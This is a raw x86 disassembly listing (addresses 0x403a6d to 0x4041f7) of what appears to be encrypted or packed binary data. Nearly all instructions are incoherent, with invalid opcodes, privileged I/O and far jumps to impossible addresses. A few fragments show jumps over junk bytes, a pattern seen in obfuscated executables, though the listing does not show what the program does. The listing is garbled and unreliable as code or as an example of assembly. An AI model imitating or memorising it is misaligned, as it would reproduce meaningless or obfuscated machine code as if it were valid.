  403a6d:	outs   dx,DWORD PTR ds:[esi]
  403a6e:	shl    ch,0x5d
  403a71:	int    0x41
  403a73:	(bad)  
  403a74:	mov    cl,0x51
  403a76:	gs addr16 mov ebp,0x6e1fdf44
  403a7d:	push   esp
  403a7e:	add    BYTE PTR [ebx],ah
  403a80:	push   esp
  403a81:	mov    ebx,0x99aa2a4c
  403a86:	loopne 0x403a71
  403a88:	outs   dx,BYTE PTR ds:[esi]
  403a89:	and    DWORD PTR [ebp+eiz*8-0x2c],esp
  403a8d:	cli    
  403a8e:	ror    BYTE PTR [ebp+0x1c27285d],cl
  403a94:	push   cs
  403a95:	or     ah,ch
  403a97:	in     eax,0x52
  403a99:	fwait
  403a9a:	aaa    
  403a9b:	dec    edi
  403a9c:	dec    edx
  403a9d:	jnp    0x403a76
  403a9f:	cs aad 0xd
  403aa2:	mov    dl,BYTE PTR [edi]
  403aa4:	and    bl,BYTE PTR [ebx-0x182fd2cc]
  403aaa:	xor    DWORD PTR [ecx-0x13],eax
  403aad:	cmp    DWORD PTR [ebx-0x42871881],ecx
  403ab3:	(bad)  
  403ab4:	fld    QWORD PTR [eax]
  403ab6:	pmullw mm4,mm0
  403ab9:	cmp    DWORD PTR [ebx+0x63477f59],eax
  403abf:	fld    DWORD PTR [esi]
  403ac1:	loop   0x403b32
  403ac3:	(bad)  [ebx]
  403ac5:	add    DWORD PTR ds:0x171a8dd2,eax
  403acb:	pop    eax
  403acc:	push   edi
  403acd:	jae    0x403b3b
  403acf:	jnp    0x403ad1
  403ad1:	lahf   
  403ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403ad3:	sub    BYTE PTR [eax+0x74cb3d3b],al
  403ad9:	push   edx
  403ada:	out    0x86,eax
  403adc:	repz fcmove st,st(2)
  403adf:	push   ebx
  403ae0:	aam    0x4f
  403ae2:	xlat   BYTE PTR ds:[ebx]
  403ae3:	cmp    DWORD PTR [edi+0x2d],eax
  403ae6:	inc    esi
  403ae7:	popa   
  403ae8:	and    BYTE PTR [eax],dl
  403aea:	stos   BYTE PTR es:[edi],al
  403aeb:	mov    DWORD PTR [edi+0x594e5f28],esp
  403af1:	popf   
  403af2:	inc    ebx
  403af3:	ds leave 
  403af5:	push   cs
  403af6:	or     edx,edi
  403af8:	(bad)  
  403af9:	into   
  403afa:	mov    ebp,0x537a7a0c
  403aff:	arpl   WORD PTR [eax+0x34b77596],dx
  403b05:	int    0x7a
  403b07:	xor    al,0xbe
  403b09:	xchg   ebx,eax
  403b0a:	jb     0x403b51
  403b0c:	mov    al,0x99
  403b0e:	cs mov ch,0x4a
  403b11:	je     0x403a9e
  403b13:	ds add al,0xeb
  403b16:	pop    ds
  403b17:	cmc    
  403b18:	out    dx,eax
  403b19:	jmp    0x2a75:0xc0854b54
  403b20:	pop    edx
  403b21:	or     BYTE PTR [ecx+0x6af1fa65],ch
  403b27:	aaa    
  403b28:	in     al,0x99
  403b2a:	outs   dx,BYTE PTR ds:[esi]
  403b2b:	jne    0x403b25
  403b2d:	jge    0x403b6a
  403b2f:	scas   eax,DWORD PTR es:[edi]
  403b30:	adc    ebx,DWORD PTR [ebp-0x53]
  403b33:	aam    0xe5
  403b35:	or     ecx,edi
  403b37:	(bad)  
  403b38:	mov    ch,0xc8
  403b3a:	jecxz  0x403b0e
  403b3c:	lea    ebp,ds:0x9d10834f
  403b42:	gs mov esp,ebx
  403b45:	retf   0xcbcb
  403b48:	fsubr  DWORD PTR [ebx]
  403b4a:	ja     0x403b1c
  403b4c:	mov    ebp,0xaa3abc9d
  403b51:	pop    esi
  403b52:	adc    BYTE PTR [edi],bh
  403b54:	push   edi
  403b55:	mov    esi,0xee3ee30e
  403b5a:	call   ebp
  403b5c:	mov    edi,0x594e32eb
  403b61:	adc    edx,DWORD PTR [ecx-0x1fedbea8]
  403b67:	(bad)  
  403b68:	in     eax,dx
  403b69:	add    ch,BYTE PTR ds:0x4f1e437
  403b6f:	mov    edi,0x179b37aa
  403b74:	stos   BYTE PTR es:[edi],al
  403b75:	pop    ebx
  403b76:	sbb    al,0x7a
  403b78:	xchg   edx,eax
  403b79:	shl    DWORD PTR [edx+0x1f57cc12],1
  403b7f:	add    eax,0xb2f881e8
  403b84:	in     al,0x56
  403b86:	push   ebx
  403b87:	jmp    0x403b21
  403b89:	ror    DWORD PTR gs:[edx+0x2e],cl
  403b8d:	out    0x7c,eax
  403b8f:	cmp    al,0xc
  403b91:	not    ch
  403b93:	ret    
  403b94:	xor    DWORD PTR [esi+0x33],edx
  403b97:	xchg   edi,eax
  403b98:	lods   al,BYTE PTR ds:[esi]
  403b99:	xchg   ebp,eax
  403b9a:	add    ecx,edx
  403b9c:	mov    ebp,DWORD PTR [ebp+edi*4+0x66728022]
  403ba3:	mov    dl,0x5f
  403ba5:	scas   al,BYTE PTR es:[edi]
  403ba6:	les    eax,FWORD PTR [si-0x1d]
  403baa:	jno    0x403bc9
  403bac:	repnz aaa 
  403bae:	mov    bh,0x94
  403bb0:	rcr    ch,0xd3
  403bb3:	add    DWORD PTR [ecx+0x4f],ebp
  403bb6:	and    al,0x87
  403bb8:	jmp    0x403b67
  403bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bbb:	mov    BYTE PTR [ecx],dl
  403bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bbe:	sub    BYTE PTR [edx-0x11],bl
  403bc1:	jbe    0x403b4d
  403bc3:	sub    DWORD PTR [edx+eax*4+0x73b642dd],eax
  403bca:	cmp    eax,0x99e70e40
  403bcf:	fs xor al,0x3f
  403bd2:	lds    edx,FWORD PTR ds:0x9677aed
  403bd8:	pop    ebp
  403bd9:	sbb    eax,DWORD PTR [esi+ebx*8]
  403bdc:	jno    0x403bbf
  403bde:	push   ss
  403bdf:	lods   al,BYTE PTR ds:[esi]
  403be0:	mov    ch,0x9
  403be2:	(bad)  
  403be3:	mov    esp,0xfddd8d91
  403be8:	scas   al,BYTE PTR es:[edi]
  403be9:	out    0x1a,al
  403beb:	push   ecx
  403bec:	js     0x403c14
  403bee:	test   al,0x2e
  403bf0:	add    ebx,DWORD PTR [ebp-0x1e]
  403bf3:	xchg   ecx,eax
  403bf4:	jl     0x403c36
  403bf6:	xor    ch,ah
  403bf8:	pop    edx
  403bf9:	cmp    eax,0x17bfe6de
  403bfe:	pop    es
  403bff:	scas   eax,DWORD PTR es:[edi]
  403c00:	cmp    eax,0x84193db7
  403c05:	or     al,0x3c
  403c07:	xor    bl,al
  403c09:	xor    al,0xf
  403c0b:	test   BYTE PTR [edi-0x38fffffb],dl
  403c11:	inc    ebp
  403c12:	call   0x74639a6
  403c17:	jmp    0x403de4
  403c1c:	scas   eax,DWORD PTR es:[edi]
  403c1d:	or     cl,BYTE PTR [edx]
  403c1f:	xor    eax,0x90b135ab
  403c24:	mov    esp,0xcfdcf48b
  403c29:	(bad)  
  403c2a:	cwde   
  403c2b:	lahf   
  403c2c:	inc    edx
  403c2d:	push   ds
  403c2e:	jle    0x403cae
  403c30:	scas   al,BYTE PTR es:[edi]
  403c31:	jg     0x403cb1
  403c33:	jle    0x403bfd
  403c35:	in     al,dx
  403c36:	cld    
  403c37:	stos   BYTE PTR es:[edi],al
  403c38:	add    eax,0x98d039ab
  403c3d:	lea    edx,[ecx]
  403c3f:	ja     0x403c8b
  403c41:	lahf   
  403c42:	(bad)  
  403c43:	sub    dl,BYTE PTR [eax-0x5cc8d8e6]
  403c49:	dec    esp
  403c4a:	mov    edi,0x156f778
  403c4f:	add    al,0x1b
  403c51:	sbb    DWORD PTR [ebp+eiz*2+0x20ea0b9c],eax
  403c58:	push   eax
  403c59:	mov    eax,0xd35d787d
  403c5e:	and    edi,DWORD PTR [esi+edi*4]
  403c61:	test   DWORD PTR [edi+0x7d],ebx
  403c64:	inc    edi
  403c65:	stc    
  403c66:	iret   
  403c67:	test   BYTE PTR ds:0xf8084df8,bh
  403c6d:	ins    BYTE PTR es:[edi],dx
  403c6e:	mov    ch,0x4f
  403c70:	rcl    DWORD PTR [ebx],0x28
  403c73:	outs   dx,DWORD PTR ds:[esi]
  403c74:	test   al,0x49
  403c76:	loopne 0x403c27
  403c78:	aaa    
  403c79:	in     al,dx
  403c7a:	mov    al,ds:0xe644f825
  403c7f:	aad    0xb3
  403c81:	add    ecx,DWORD PTR [ebp-0x27]
  403c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403c85:	(bad)  
  403c86:	aam    0x5d
  403c88:	sahf   
  403c89:	fwait
  403c8a:	cmp    eax,0x1d83054b
  403c8f:	jl     0x403ce2
  403c91:	xchg   BYTE PTR [esp+esi*2+0x15],bl
  403c95:	adc    BYTE PTR [eax-0x7ccdbcc9],ch
  403c9b:	test   BYTE PTR [ebp-0x5d1c151a],ch
  403ca1:	jl     0x403d06
  403ca3:	scas   eax,DWORD PTR es:[edi]
  403ca4:	and    eax,0x284b5aac
  403ca9:	or     al,0xd7
  403cab:	lds    esp,FWORD PTR [edx-0x34]
  403cae:	test   al,0xfe
  403cb0:	push   ss
  403cb1:	mov    edx,?
  403cb3:	cmp    esp,DWORD PTR [edi+0x67]
  403cb6:	dec    esi
  403cb7:	sub    al,0xd6
  403cb9:	loop   0x403cfd
  403cbb:	sub    al,0x9a
  403cbd:	(bad)  
  403cbe:	sub    eax,0xe830495a
  403cc3:	aaa    
  403cc4:	add    al,0x63
  403cc6:	mov    ecx,0xa17c99e6
  403ccb:	or     edi,DWORD PTR [esi+0x7cb1c6b5]
  403cd1:	and    ah,bl
  403cd3:	cdq    
  403cd4:	in     eax,dx
  403cd5:	dec    edi
  403cd6:	and    BYTE PTR [ecx-0x34],ah
  403cd9:	sbb    bh,dl
  403cdb:	out    dx,al
  403cdc:	pop    ebp
  403cdd:	inc    ebp
  403cde:	jmp    0xfc25:0xe2c0c60c
  403ce5:	loope  0x403d5b
  403ce7:	inc    ecx
  403ce8:	repz call 0xecf8878a
  403cee:	pop    es
  403cef:	das    
  403cf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403cf1:	iret   
  403cf2:	iret   
  403cf3:	inc    ebp
  403cf4:	test   BYTE PTR [esi+0x4bfa8eab],bh
  403cfa:	push   eax
  403cfb:	pop    ss
  403cfc:	in     eax,0x62
  403cfe:	inc    esi
  403cff:	fsubp  st(3),st
  403d01:	nop
  403d02:	mov    esi,0x98c2661e
  403d07:	dec    esi
  403d08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d09:	sub    bl,BYTE PTR [eax-0x3bf79149]
  403d0f:	popf   
  403d10:	cmp    al,0x92
  403d12:	pop    ecx
  403d13:	call   0xf33d:0x76e9045e
  403d1a:	xor    eax,0xc4f047b7
  403d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d20:	mov    ecx,0xd8036a6e
  403d25:	jbe    0x403d77
  403d27:	sub    esi,ebx
  403d29:	(bad)  
  403d2a:	test   ebp,edi
  403d2c:	fist   WORD PTR [edx-0x49]
  403d2f:	mov    bl,0xa2
  403d31:	pop    eax
  403d32:	pop    edi
  403d33:	and    eax,0x3778b177
  403d38:	mov    DWORD PTR [edx],ecx
  403d3a:	add    DWORD PTR [ecx-0x2f1d808],ebp
  403d40:	cmp    ecx,esp
  403d42:	jp     0x403d0e
  403d44:	jecxz  0x403d2c
  403d46:	retf   
  403d47:	xchg   ebp,eax
  403d48:	sbb    ah,BYTE PTR ds:0xab3cc85f
  403d4e:	fld    DWORD PTR [edi-0x74]
  403d51:	in     al,dx
  403d52:	retf   
  403d53:	sbb    DWORD PTR [edi+ebx*1],edx
  403d56:	scas   eax,DWORD PTR es:[edi]
  403d57:	mov    dl,0x11
  403d59:	xchg   esp,eax
  403d5a:	mov    eax,ds:0x6c549e53
  403d5f:	jmp    0xc1bdd15c
  403d64:	mov    esi,0x49ae8f6d
  403d69:	out    0xb7,eax
  403d6b:	mov    ds:0x2de1736c,al
  403d70:	stc    
  403d71:	loopne 0x403d94
  403d73:	sub    cl,BYTE PTR [ebx]
  403d75:	cmp    esp,edx
  403d77:	retf   0x80a0
  403d7a:	ficomp DWORD PTR [edx+0xc95c9a2]
  403d80:	push   edx
  403d81:	je     0x403dff
  403d83:	xchg   ebp,eax
  403d84:	add    bh,bh
  403d86:	push   0xe4ca258f
  403d8b:	or     eax,0xaf86f3ae
  403d90:	fld    DWORD PTR [eax-0x74]
  403d93:	mov    bl,0xf6
  403d95:	mov    ecx,0x45506250
  403d9a:	jmp    ebx
  403d9c:	inc    esi
  403d9d:	jle    0x403d7c
  403d9f:	push   0xb530b178
  403da4:	and    BYTE PTR [edi],bh
  403da6:	mov    al,0xa8
  403da8:	cmp    BYTE PTR [edi],ah
  403daa:	mov    ds:0x10e85d36,al
  403daf:	std    
  403db0:	push   esi
  403db1:	or     DWORD PTR [esi-0x72],ebp
  403db4:	aam    0xa0
  403db6:	jmp    0x5ddd512b
  403dbb:	fwait
  403dbc:	js     0x403e15
  403dbe:	ret    
  403dbf:	leave  
  403dc0:	inc    esi
  403dc1:	xor    BYTE PTR [ebx+0x45],ah
  403dc4:	bound  esp,QWORD PTR ds:0xab33bcd9
  403dca:	jmp    0x403dbc
  403dcc:	daa    
  403dcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403dce:	jp     0x403e46
  403dd0:	and    ecx,DWORD PTR [ecx+eiz*8]
  403dd3:	nop
  403dd4:	fwait
  403dd5:	into   
  403dd6:	pop    ebx
  403dd7:	mov    cl,0xc6
  403dd9:	sub    BYTE PTR [edi+0x5389a5e3],0xcb
  403de0:	lods   al,BYTE PTR ds:[esi]
  403de1:	jmp    0x403dba
  403de3:	aaa    
  403de4:	lea    eax,[ebp-0x18]
  403de7:	mov    DWORD PTR [ebp-0x14],eax
  403dea:	mov    eax,DWORD PTR [ebp-0x14]
  403ded:	add    DWORD PTR [eax],0x705fa8f
  403df3:	jmp    0x403fc0
  403df8:	mov    ebp,0xd441cc57
  403dfd:	inc    ecx
  403dfe:	push   ecx
  403dff:	push   ebx
  403e00:	jb     0x403dc4
  403e02:	and    DWORD PTR [edi+0x3daab47f],0x7e7e1cf2
  403e0c:	scas   al,BYTE PTR es:[edi]
  403e0d:	jg     0x403e8d
  403e0f:	jle    0x403e5a
  403e11:	xor    BYTE PTR [esi],cl
  403e13:	sbb    eax,0x398f140c
  403e18:	mov    edx,0x781f5da
  403e1d:	aad    0xd8
  403e1f:	(bad)  
  403e21:	jns    0x403e35
  403e23:	cmp    bl,0xfb
  403e26:	dec    esp
  403e27:	cli    
  403e28:	adc    BYTE PTR [ebp-0x52],0xcf
  403e2c:	sbb    DWORD PTR [eax],edx
  403e2e:	aaa    
  403e2f:	push   ss
  403e30:	imul   ebx,DWORD PTR es:[ecx+esi*8],0x78
  403e35:	popa   
  403e36:	mov    cl,0x3f
  403e38:	pop    esp
  403e39:	mov    fs,WORD PTR [ebp+edi*8-0x3b9a4451]
  403e40:	int3   
  403e41:	dec    edi
  403e42:	inc    esp
  403e43:	aam    0x77
  403e45:	stos   BYTE PTR es:[edi],al
  403e46:	leave  
  403e47:	dec    eax
  403e48:	imul   ecx,DWORD PTR [ebx+edi*4+0x33672c3f],0x4a339621
  403e53:	adc    esp,DWORD PTR [ebp-0x7fa7f07d]
  403e59:	test   edi,esp
  403e5b:	mov    bl,0xf8
  403e5d:	mov    edi,0xd3b51444
  403e62:	test   al,0x7
  403e64:	(bad)  
  403e65:	jb     0x403e4d
  403e67:	dec    ecx
  403e68:	fnsave [edx+0x7163e5a6]
  403e6e:	or     DWORD PTR [edi],edx
  403e70:	mov    edi,0x2e137375
  403e75:	(bad)  
  403e76:	(bad)  
  403e77:	fiadd  WORD PTR [ebx-0x515d4454]
  403e7d:	jne    0x403ebf
  403e7f:	call   FWORD PTR [edx+0x16]
  403e82:	jg     0x403e99
  403e84:	sub    al,0x27
  403e86:	inc    esp
  403e87:	in     eax,0xd8
  403e89:	in     al,dx
  403e8a:	dec    edx
  403e8b:	and    al,0x2e
  403e8d:	mov    edi,es
  403e8f:	jp     0x403eb3
  403e91:	jmp    0x1a89403d
  403e96:	popa   
  403e97:	mov    ebp,DWORD PTR [ecx+0x21]
  403e9a:	inc    eax
  403e9b:	loop   0x403e26
  403e9d:	mov    dl,0x55
  403e9f:	xchg   BYTE PTR [eax],dl
  403ea1:	inc    edi
  403ea2:	mov    cl,0xcf
  403ea4:	mov    ah,0x14
  403ea6:	sub    al,0xb
  403ea8:	jbe    0x403eb6
  403eaa:	dec    ebx
  403eab:	jno    0x403ea4
  403ead:	mov    ah,0x5f
  403eaf:	nop
  403eb0:	xchg   ebx,eax
  403eb1:	xor    BYTE PTR ds:0x5f7557ce,ch
  403eb7:	xor    ebp,DWORD PTR [esi]
  403eb9:	cmc    
  403eba:	add    dl,0x62
  403ebd:	cmp    dl,BYTE PTR [edx+0x90a31f9]
  403ec3:	cmp    DWORD PTR [ecx],edi
  403ec5:	cmp    bl,BYTE PTR [ebx+0x4a4b040]
  403ecb:	fyl2xp1 
  403ecd:	push   ebp
  403ece:	jns    0x403e9c
  403ed0:	shl    BYTE PTR [edi-0x592be6cd],cl
  403ed6:	mov    ds:0xff3543d1,eax
  403edb:	cwde   
  403edc:	retf   0x5869
  403edf:	pop    eax
  403ee0:	lea    esp,[ecx]
  403ee2:	js     0x403e79
  403ee4:	jb     0x403e77
  403ee6:	mov    BYTE PTR [edx+0x4f5f59f3],bh
  403eec:	and    edi,0xfffffffc
  403eef:	aam    0xeb
  403ef1:	mov    al,ds:0xe60a0601
  403ef6:	and    al,0x39
  403ef8:	xor    al,0x5c
  403efa:	scas   al,BYTE PTR es:[edi]
  403efb:	fldcw  WORD PTR ds:0x758d0cc4
  403f01:	shl    DWORD PTR [ebp+0x3d4352f0],cl
  403f07:	dec    eax
  403f08:	add    eax,DWORD PTR [ecx]
  403f0a:	xchg   DWORD PTR [eax],ebp
  403f0c:	pop    ss
  403f0d:	bound  eax,QWORD PTR [ecx+eiz*1-0x49]
  403f11:	push   es
  403f12:	pusha  
  403f13:	inc    esp
  403f14:	xor    eax,0xc0136689
  403f19:	inc    ah
  403f1b:	adc    ch,BYTE PTR [ecx]
  403f1d:	push   esi
  403f1e:	or     eax,0x23479f23
  403f23:	lods   al,BYTE PTR ds:[esi]
  403f24:	shr    ecx,1
  403f26:	pop    edi
  403f27:	popa   
  403f28:	pop    esi
  403f29:	cmc    
  403f2a:	(bad)  
  403f2b:	cmp    ebx,DWORD PTR [edi]
  403f2d:	push   ecx
  403f2e:	push   ebx
  403f2f:	aas    
  403f30:	call   0xc188a0b4
  403f35:	neg    DWORD PTR [edi+0x4c]
  403f38:	pushf  
  403f39:	int3   
  403f3a:	clc    
  403f3b:	push   0xc729f773
  403f40:	inc    esp
  403f41:	pop    ebx
  403f42:	or     edi,ebp
  403f44:	hlt    
  403f45:	fwait
  403f46:	lods   eax,DWORD PTR ds:[esi]
  403f47:	xor    ah,BYTE PTR [eax-0x7512a1cc]
  403f4d:	lahf   
  403f4e:	add    DWORD PTR [esi],edi
  403f50:	adc    al,ah
  403f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f53:	cmp    dh,0xc6
  403f56:	cld    
  403f57:	pop    ebp
  403f58:	push   ds
  403f59:	push   ebx
  403f5a:	and    cl,cl
  403f5c:	mov    cl,dh
  403f5e:	mov    al,ds:0x9fe44493
  403f63:	mov    edx,0xefdb2709
  403f68:	call   0x9ba5:0x34bcb822
  403f6f:	sub    ecx,DWORD PTR [ebx+edi*8]
  403f72:	(bad)  
  403f73:	and    al,0xfb
  403f75:	lahf   
  403f76:	pop    ebp
  403f77:	mov    ecx,eax
  403f79:	adc    eax,0x346a1428
  403f7e:	retf   0x1931
  403f81:	ds and edx,ecx
  403f84:	repz ret 0xd3f8
  403f88:	push   eax
  403f89:	dec    esi
  403f8a:	cmp    eax,0xbe406c95
  403f8f:	aam    0x6c
  403f91:	or     ch,ah
  403f93:	cmp    ch,al
  403f95:	push   cs
  403f96:	push   ss
  403f97:	dec    eax
  403f98:	push   ebx
  403f99:	fsub   QWORD PTR [ebx+0x6bad488]
  403f9f:	jo     0x403fca
  403fa1:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa3:	or     DWORD PTR [esi-0x580d7506],ebp
  403fa9:	(bad)  
  403faa:	mov    esp,0x35818c51
  403faf:	inc    edi
  403fb0:	fdivr  QWORD PTR [esi-0x9]
  403fb3:	jp     0x403ff1
  403fb5:	jl     0x403fa0
  403fb7:	es out 0xb8,al
  403fba:	fstp   DWORD PTR [ebx+0x6b]
  403fbd:	or     al,BYTE PTR [ebx+edi*1-0x75]
  403fc1:	inc    ebp
  403fc2:	lock mov edx,DWORD PTR [ebp+0x8]
  403fc6:	xor    eax,ecx
  403fc8:	jmp    0x404195
  403fcd:	pop    edi
  403fce:	sub    al,0x9f
  403fd0:	dec    edx
  403fd1:	ins    DWORD PTR es:[edi],dx
  403fd2:	dec    ecx
  403fd3:	imul   ebp,DWORD PTR [ecx],0x54
  403fd6:	and    dl,0x1
  403fd9:	outs   dx,DWORD PTR ds:[esi]
  403fda:	icebp  
  403fdb:	add    edx,esp
  403fdd:	and    bl,BYTE PTR [edx]
  403fdf:	jle    0x40405f
  403fe1:	scas   al,BYTE PTR es:[edi]
  403fe2:	jg     0x404062
  403fe4:	jle    0x403f8b
  403fe6:	iret   
  403fe7:	xor    DWORD PTR [ecx],ebp
  403fe9:	xchg   DWORD PTR [edi-0x67240084],eax
  403fef:	into   
  403ff0:	cmp    edi,DWORD PTR [esi-0x39]
  403ff3:	dec    ecx
  403ff4:	inc    eax
  403ff5:	mov    esp,0xe79050e4
  403ffa:	enter  0x2dd3,0x99
  403ffe:	jge    0x403ff7
  404000:	cmp    eax,0x1d3dc03d
  404005:	push   ecx
  404006:	jae    0x403fef
  404008:	pusha  
  404009:	test   dl,bh
  40400b:	jg     0x404037
  40400d:	retf   
  40400e:	int    0x8c
  404010:	daa    
  404011:	hlt    
  404012:	pop    ds
  404013:	cdq    
  404014:	int    0x4c
  404016:	sti    
  404017:	jns    0x404045
  404019:	aaa    
  40401a:	inc    esp
  40401b:	out    0xb8,eax
  40401d:	iret   
  40401e:	repz stc 
  404020:	call   0xd225:0x6639758a
  404027:	std    
  404028:	pop    ebx
  404029:	xor    ebx,DWORD PTR [esp+eax*4+0x56]
  40402d:	pop    edx
  40402e:	dec    ecx
  40402f:	inc    ecx
  404030:	adc    BYTE PTR [ebp+0x7c],bh
  404033:	das    
  404034:	dec    BYTE PTR [ebx]
  404036:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404037:	xor    al,0xff
  404039:	dec    ecx
  40403a:	or     eax,0x75aeb1f8
  40403f:	sti    
  404040:	adc    bl,ah
  404042:	lods   al,BYTE PTR ds:[esi]
  404043:	aaa    
  404044:	dec    esi
  404045:	xchg   ecx,eax
  404046:	fs adc al,0xf2
  404049:	js     0x403fe7
  40404b:	shl    BYTE PTR [ebp+0x7f3f404],cl
  404051:	pop    es
  404052:	sub    DWORD PTR [ebx+0x12],0x63
  404056:	mov    edi,0x736ee62
  40405b:	mov    dh,0xc5
  40405d:	mov    al,ds:0xbc2f9c14
  404062:	jo     0x40402d
  404064:	inc    BYTE PTR [edi+0x23439e49]
  40406a:	jmp    0x9c2a9724
  40406f:	shr    esp,1
  404071:	fcom   QWORD PTR [edi]
  404073:	pop    ss
  404074:	shl    DWORD PTR [esp+ebx*8-0x57],1
  404078:	lds    esi,FWORD PTR [ecx+0x4cd2ebae]
  40407e:	in     eax,0x76
  404080:	test   DWORD PTR [edi+0x74b4ef09],esi
  404086:	inc    esp
  404087:	cmp    al,0x70
  404089:	jno    0x404085
  40408b:	in     al,0xf6
  40408d:	push   eax
  40408e:	and    DWORD PTR [edx+0x5adf30ef],eax
  404094:	loopne 0x4040e2
  404096:	cmp    BYTE PTR [ecx-0x288fec31],0x70
  40409d:	pop    eax
  40409e:	sub    ch,ah
  4040a0:	mov    WORD PTR [esi+0x747e6ee8],fs
  4040a6:	mov    eax,0x773412f0
  4040ab:	push   esi
  4040ac:	aad    0xd3
  4040ae:	repnz mov esp,DWORD PTR [edi+0x75a4f5e1]
  4040b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4040b6:	imul   ecx,ebp,0x76
  4040b9:	ficom  WORD PTR [eax+0x11]
  4040bc:	iret   
  4040bd:	push   0x75f55075
  4040c2:	das    
  4040c3:	xchg   ecx,eax
  4040c4:	xlat   BYTE PTR ds:[ebx]
  4040c5:	into   
  4040c6:	lahf   
  4040c7:	xlat   BYTE PTR ds:[ebx]
  4040c8:	mov    bl,0x87
  4040ca:	mov    ch,0xdd
  4040cc:	push   ds
  4040cd:	dec    edi
  4040ce:	retf   
  4040cf:	sahf   
  4040d0:	and    al,0x3b
  4040d2:	ret    
  4040d3:	add    esi,edi
  4040d5:	popa   
  4040d6:	cmp    DWORD PTR [ebx-0x56],esp
  4040d9:	adc    DWORD PTR [eax+0x9],0xffffffc1
  4040dd:	xor    eax,DWORD PTR [edx]
  4040df:	icebp  
  4040e0:	adc    cl,BYTE PTR [edx]
  4040e2:	ins    DWORD PTR es:[edi],dx
  4040e3:	cmp    eax,0x87730066
  4040e8:	inc    eax
  4040e9:	mov    ch,0xeb
  4040eb:	xchg   ebx,eax
  4040ec:	sub    eax,0x425723ec
  4040f1:	push   0x17
  4040f3:	pushf  
  4040f4:	dec    ebp
  4040f5:	xor    BYTE PTR [esi+ebx*1],al
  4040f8:	enter  0xc369,0x87
  4040fc:	or     eax,DWORD PTR [eax+esi*8]
  4040ff:	js     0x4040b7
  404101:	aas    
  404102:	dec    ecx
  404103:	hlt    
  404104:	mov    ch,0x7
  404106:	push   cs
  404107:	adc    cl,dh
  404109:	inc    esi
  40410a:	dec    edi
  40410b:	enter  0xb6bb,0x73
  40410f:	add    edi,DWORD PTR ds:0xda09a0cf
  404115:	ror    dh,1
  404117:	(bad)  
  404118:	retf   
  404119:	scas   al,BYTE PTR es:[edi]
  40411a:	ins    BYTE PTR es:[edi],dx
  40411b:	mov    dh,0x5b
  40411d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40411e:	inc    edi
  40411f:	fnstcw WORD PTR [ecx+edi*4+0x552462db]
  404126:	adc    esi,DWORD PTR [ebp+0x60]
  404129:	add    dh,BYTE PTR [esi-0x1]
  40412c:	and    ch,BYTE PTR [edx-0x7c]
  40412f:	ss pop ecx
  404131:	iret   
  404132:	ins    BYTE PTR es:[edi],dx
  404133:	call   0xa762bb63
  404138:	(bad)  
  404139:	mov    dl,0x64
  40413b:	xlat   BYTE PTR ds:[ebx]
  40413c:	jbe    0x4041a0
  40413e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40413f:	pop    es
  404140:	ficom  DWORD PTR [ebp+0x4c]
  404143:	sbb    ah,bl
  404145:	cmc    
  404146:	stos   BYTE PTR es:[edi],al
  404147:	and    al,0x9c
  404149:	ins    BYTE PTR es:[edi],dx
  40414a:	jl     0x404199
  40414c:	int3   
  40414d:	stos   BYTE PTR es:[edi],al
  40414e:	xor    eax,ebx
  404150:	ins    BYTE PTR es:[edi],dx
  404151:	jno    0x404199
  404153:	(bad)
  404156:	arpl   WORD PTR [ebp+0x1e],cx
  404159:	out    dx,eax
  40415a:	test   DWORD PTR [eax+0x1c],ebx
  40415d:	arpl   dx,bp
  40415f:	pop    ecx
  404160:	neg    BYTE PTR [eax+0x7dfcf6bb]
  404166:	scas   eax,DWORD PTR es:[edi]
  404167:	ss inc edx
  404169:	cmove  edx,DWORD PTR [ebx+eiz*4]
  40416d:	in     al,dx
  40416e:	shr    DWORD PTR [esi+ecx*4-0x2931df59],cl
  404175:	xchg   edi,eax
  404176:	mov    cl,0x90
  404178:	cmp    al,0x6c
  40417a:	sbb    BYTE PTR [ebp-0x1712cb3],bl
  404180:	push   0x86122fb5
  404185:	push   cs
  404186:	arpl   WORD PTR [edx-0x3af949ed],si
  40418c:	xchg   edx,eax
  40418d:	sub    al,BYTE PTR [ebx+0x120002df]
  404193:	les    ebx,FWORD PTR [esi-0x73]
  404196:	test   BYTE PTR [eax],dl
  404198:	fwait
  404199:	jb     0x4041cd
  40419b:	add    BYTE PTR [ecx+0x45ff0845],cl
  4041a1:	or     al,0xe9
  4041a3:	arpl   ax,di
  4041a5:	(bad)  
  4041a6:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4041ac:	mov    ecx,DWORD PTR [ebp+0x10]
  4041af:	add    eax,esi
  4041b1:	mov    DWORD PTR [ecx],eax
  4041b3:	pop    esi
  4041b4:	leave  
  4041b5:	ret    0xc
  4041b8:	push   ebp
  4041b9:	mov    ebp,esp
  4041bb:	push   ecx
  4041bc:	push   ecx
  4041bd:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  4041c4:	jmp    0x404388
  4041c9:	call   0xb2b3:0xa7939f83
  4041d0:	mov    bl,0x67
  4041d2:	ja     0x4041f1
  4041d4:	pop    esp
  4041d5:	sub    esp,DWORD PTR [ecx]
  4041d7:	xor    BYTE PTR [edx+0x52],ch
  4041da:	sbb    edi,DWORD PTR [esi+0x7e]
  4041dd:	cdq    
  4041de:	jg     0x40425e
  4041e0:	jle    0x404244
  4041e2:	cmc    
  4041e3:	mov    dh,0x25
  4041e5:	aas    
  4041e6:	mov    eax,ds:0x56b0e50b
  4041eb:	xchg   BYTE PTR [ebp+0x67],dh
  4041ee:	repnz fs mov ebp,0x87f9a891
  4041f5:	xlat   BYTE PTR ds:[ebx]
  4041f6:	lods   al,BYTE PTR ds:[esi]
  4041f7:	not    DWORD PTR [ecx+0x6440036f]
